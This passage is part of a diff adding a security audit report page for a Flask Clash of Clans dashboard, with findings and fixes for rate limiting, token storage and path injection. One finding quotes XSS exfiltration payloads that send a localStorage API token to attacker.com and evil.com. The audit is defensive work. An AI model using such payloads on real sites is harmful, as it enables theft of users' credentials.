+    description: "The <code>/api/coc/proxy</code> endpoint has no per-user or per-IP rate limit. A tight request loop (authenticated or via CSRF) can exhaust the CoC API key's rate limit. Additionally, each proxy call holds the single-threaded Werkzeug server thread for up to 10 seconds (the <code>urlopen</code> timeout), blocking all other dashboard users during that window.",
+    evidence: `app.py:376 — no @limiter.limit() decorator:
+@app.route("/api/coc/proxy", methods=["POST"])
+@login_required
+def coc_proxy():
+
+app.py:410 — 10-second thread-blocking timeout:
+with _ureq.urlopen(req, timeout=10) as resp:`,
+    fix: `# pip install flask-limiter
+from flask_limiter import Limiter, util
+limiter = Limiter(app, key_func=util.get_remote_address)
+
+@app.route("/api/coc/proxy", methods=["POST"])
+@login_required
+@limiter.limit("30 per minute")
+def coc_proxy():
+    ...`,
+  },
+  {
+    id: "PROXY-MED-001",
+    severity: "MEDIUM",
+    title: "Proxy: CoC API Key Stored in localStorage — Exfiltrable via Any XSS",
+    file: "web/templates/index.html:729-742",
+    category: "Sensitive Data Exposure / XSS (CWE-312, CWE-79)",
+    description: "The CoC developer API token is saved to <code>localStorage</code> under <code>'coc_api_key'</code>. localStorage is persistent across browser restarts, shared across all tabs of the same origin, and fully readable by any JavaScript executing in that origin. The existing XSS vectors (LOW-005 strategy names, MED-001 strategy names rendered via innerHTML) can exfiltrate the token trivially: <code>fetch('https://attacker.com/?t='+localStorage.getItem('coc_api_key'))</code>.",
+    evidence: `// index.html:729-737 — persistent storage
+localStorage.setItem('coc_api_key', k);
+
+// index.html:741-742 — loaded on every page view
+const savedKey = localStorage.getItem('coc_api_key');
+
+// XSS exfiltration payload (via LOW-005 / MED-001):
+// <img src=x onerror="fetch('//evil.com/?t='+localStorage.getItem('coc_api_key'))">`,
+    fix: `// Option 1 (easy): replace localStorage with sessionStorage
+sessionStorage.setItem('coc_api_key', k);
+const savedKey = sessionStorage.getItem('coc_api_key');
+
+// Option 2 (best): store token server-side in Flask session;
+// never return it to the browser after initial save.`,
+  },
+  {
+    id: "PROXY-MED-002",
+    severity: "MEDIUM",
+    title: "Proxy: Path Parameter Allows Query String Injection and Unrestricted CoC Endpoint Access",
+    file: "web/app.py:395-399",
+    category: "Input Validation / Partial SSRF (CWE-918, CWE-20)",
+    description: "The proxy validates only that <code>path</code> starts with <code>'/'</code>. The path is concatenated directly to the base URL before <code>urlencode</code> appends the params dict. A path like <code>\"/clans?limit=1000\"</code> injects a query string before the legitimate params, bypassing frontend field validation. Any CoC API path (including undocumented endpoints) is reachable — not just the UI's curated list. Full cross-host SSRF is not achievable because the base URL hostname is hardcoded and urllib does not redirect based on path content.",
+    evidence: `app.py:395-399
+if not path.startswith("/"):
+    return jsonify({"error": "Invalid path"}), 400
+url = "https://api.clashofclans.com/v1" + path   // unsanitized path
+if params:
+    url += "?" + _uparse.urlencode(params)
+
+// path="/clans?limit=1000" produces:
+// https://api.clashofclans.com/v1/clans?limit=1000&<other_params>`,
+    fix: `from urllib.parse import urlsplit
+
+# Strip query string and fragment from path before concatenation:
+parsed = urlsplit(path)
+safe_path = parsed.path
+if not safe_path.startswith("/"):
+    return jsonify({"error": "Invalid path"}), 400
+
+# Optionally allowlist known CoC API prefixes:
+ALLOWED_PREFIXES = ('/clans', '/players', '/leagues', '/locations',
+                    '/labels', '/goldpass', '/clanwarleagues',
+                    '/builderbaseleagues', '/warleagues')
+if not any(safe_path.startswith(p) for p in ALLOWED_PREFIXES):
+    return jsonify({"error": "Path not allowed"}), 400
+
+url = "https://api.clashofclans.com/v1" + safe_path`,
+  },
+];
+
+// Sort by severity then render
+const SEV_ORDER = { CRITICAL:0, HIGH:1, MEDIUM:2, LOW:3, INFORMATIONAL:4 };
+findings.sort((a, b) => (SEV_ORDER[a.severity] ?? 5) - (SEV_ORDER[b.severity] ?? 5));
+
+// Compute summary counts dynamically
+const counts = { CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0, INFORMATIONAL:0, FIXED:0 };
+findings.forEach(f => {
+  if (f.status === "FIXED") counts.FIXED++;
+  else counts[f.severity] = (counts[f.severity] || 0) + 1;
+});
+document.querySelector(".sc-crit .count").textContent  = counts.CRITICAL;
+document.querySelector(".sc-high .count").textContent  = counts.HIGH;
+document.querySelector(".sc-med .count").textContent   = counts.MEDIUM;
+document.querySelector(".sc-low .count").textContent   = counts.LOW;
+document.querySelector(".sc-info .count").textContent  = counts.INFORMATIONAL;
+document.querySelector(".sc-fixed .count").textContent = counts.FIXED;
+
+// Update filter button labels
+const total = findings.length;
+document.querySelector(".f-all").textContent    = `All (${total})`;
+document.querySelector(".f-crit").textContent   = `Critical (${counts.CRITICAL})`;
+document.querySelector(".f-high").textContent   = `High (${counts.HIGH})`;
+document.querySelector(".f-medium").textContent = `Medium (${counts.MEDIUM})`;
+document.querySelector(".f-low").textContent    = `Low (${counts.LOW})`;
+document.querySelector(".f-info").textContent   = `Info (${counts.INFORMATIONAL})`;
+
+// Render
+const container = document.getElementById("cards");
+
+function escapeHtml(str) {
+  return str.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+
+function renderCard(f) {
+  const div = document.createElement("div");
+  const isFixed = f.status === "FIXED";
+  div.className = `card sev-${f.severity}${isFixed ? " status-fixed" : ""}`;
+  div.dataset.sev = f.severity;
+
+  const fixedBadge = isFixed ? `<span class="fixed-badge">FIXED</span>` : "";
+  const fixedNote = isFixed
+    ? `<div class="remediation-note"><strong>Fixed ${f.fixDate}:</strong> ${escapeHtml(f.remediationApplied)}</div>`
+    : "";
+
+  div.innerHTML = `
+    <div class="card-header">
+      <span class="badge">${f.severity}</span>
+      <div style="flex:1">
+        <div class="card-title">${f.title}${fixedBadge}</div>
+        <div class="card-id">${f.id}</div>
+      </div>
+      <svg class="chevron" viewBox="0 0 20 20" fill="currentColor">
+        <path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"/>
+      </svg>
+    </div>
+    <div class="card-meta">
+      <span><strong>File</strong> ${f.file}</span>
+      <span><strong>Category</strong> ${f.category}</span>
+    </div>
+    <div class="card-body">
+      <p>${f.description}</p>
+      ${fixedNote}
+      <div class="section-label">Evidence</div>
+      <pre>${escapeHtml(f.evidence)}</pre>
+      <div class="section-label">Remediation</div>
+      <pre>${escapeHtml(f.fix)}</pre>
+    </div>
+  `;
+
+  div.addEventListener("click", () => div.classList.toggle("open"));
+  return div;
+}
+
+findings.forEach(f => container.appendChild(renderCard(f)));
+
+// Filter
+function filter(sev) {
+  document.querySelectorAll(".filter-btn").forEach(b => b.classList.remove("active"));
+  const btn = document.querySelector(`.f-${sev.toLowerCase()}`);
+  if (btn) btn.classList.add("active");
+
+  document.querySelectorAll(".card").forEach(card => {
+    card.classList.toggle("hidden", sev !== "all" && card.dataset.sev !== sev);
+  });
+}
+</script>
+</body>
+</html>
